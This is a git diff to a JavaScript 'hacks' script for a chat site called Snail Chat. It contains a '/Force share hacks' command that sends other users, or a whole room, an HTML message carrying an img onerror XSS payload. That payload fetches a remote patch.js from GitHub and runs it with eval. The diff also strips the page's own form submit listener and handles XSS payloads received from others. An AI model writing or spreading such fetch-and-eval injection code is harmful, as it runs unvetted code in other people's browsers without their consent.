@@ -98,11 +98,11 @@ const snail = {
             commands: "/Force share hacks",
             handler: `
             let user = input.value.split(" ")[3];
-            let script = "<img src='a' onerror=\`javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>";
+            let script = "<img src='a' onerror=\`fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>";
             if (user) {
-                script.replace("<img src='a' onerror=\`javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>", "if (window.name == user) {<img src='a' onerror=\`javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>}");
+                script.replace("<img src='a' onerror=\`fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>", "if (window.name == \"'\" +  user + \"'\") {<img src='a' onerror=\`fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>}");
             }
-            socket.emit("html message", script, room)
+            socket.emit("html message", script, room);
             `,
             description: "Force shares the snail hacks to a specific user or all users in a room. Usage: username (leave blank for all users in the room)."
         },
@@ -127,8 +127,6 @@ const snail = {
         */
     ]
 };
-
-form.removeEventListener("submit", getEventListeners(form).submit[0].listener);
 
 form.addEventListener("submit", (e) => {
     e.preventDefault();
@@ -221,7 +219,7 @@ socket.on('html message', (msg, room1) => {
         let button = document.createElement("button");
         item.appendChild(button);
         button.setAttribute("data", snail.xssTimes);
-        button.setAttribute("onclick", `addHTML("[{from room: ${room1}}]: " + snail.xssPayloads[Number(this.getAttribute('data'))]); this.remove();`);
+        button.setAttribute("onclick", `addHTML("[{from room: ${room1}}]: " + snail.xssPayloads[Number(this.getAttribute('data')) - 1]); this.remove();`);
         button.innerText = "Allow (Runs this code)";
         showMsg("^^!!If you don't know what this means, don't click add. You could get hacked!!^^ (Make sure you trust this person if you don't understand the code and want to press Add)")
     }
